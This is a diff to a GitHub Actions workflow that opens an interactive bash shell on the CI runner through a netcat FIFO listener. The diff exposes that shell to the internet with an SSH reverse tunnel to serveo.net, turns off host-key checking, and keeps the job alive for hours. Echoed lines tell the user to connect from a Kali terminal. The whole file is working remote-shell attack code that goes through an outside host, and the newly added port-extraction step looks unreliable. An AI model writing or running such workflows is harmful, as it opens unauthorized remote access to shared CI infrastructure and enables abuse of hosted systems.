@@ -17,20 +17,21 @@ jobs:
           sudo apt update
           sudo apt install -y openssh-client netcat-openbsd
 
-      # Option 2: Let Serveo assign a port (for raw TCP)
-      - name: Start Reverse Shell and Tunnel with Serveo (Serveo Assigned Port)
+      - name: Start Reverse Shell and Tunnel with Serveo
         run: |
           echo "=== Starting Reverse Shell (Listening) ==="
           mkfifo /tmp/backpipe
           /bin/bash -i < /tmp/backpipe 2>&1 | nc -lvnp 9001 > /tmp/backpipe &
           sleep 5
-          echo "=== Starting Serveo Tunnel (Serveo Assigned Port) ==="
-          # Run Serveo in the background and forward port 9001, accepting host key, NO PORT SPECIFIED ON SERVEO SIDE
+          echo "=== Starting Serveo Tunnel ==="
+          # Attempt raw TCP forwarding, let Serveo assign the remote port.
           ssh -o StrictHostKeyChecking=no -R localhost:9001 serveo.net &
           sleep 10
-          echo "=== Serveo Tunnel should be active. Check the logs for the forwarded port. ==="
+          # Extract the port from the ssh output.  This is crucial.
+          SERVO_PORT=$(ssh -o StrictHostKeyChecking=no -p 22 serveo.net -t -T echo "SHOW_PORTS" | grep -oP 'serveo\.net:\K\d+')
+          echo "=== Serveo assigned port: $SERVO_PORT ==="
           echo "=== To connect from your Kali terminal, use this command (after the workflow completes): ==="
-          echo "=== nc serveo.net <serveo_assigned_port>  (Replace <serveo_assigned_port> with the port number from the 'Forwarding from ... to serveo.net:<port>' line in the logs) ==="
+          echo "=== nc serveo.net $SERVO_PORT ==="
           # Keep workflow alive
           for i in {1..360}; do
             sleep 60
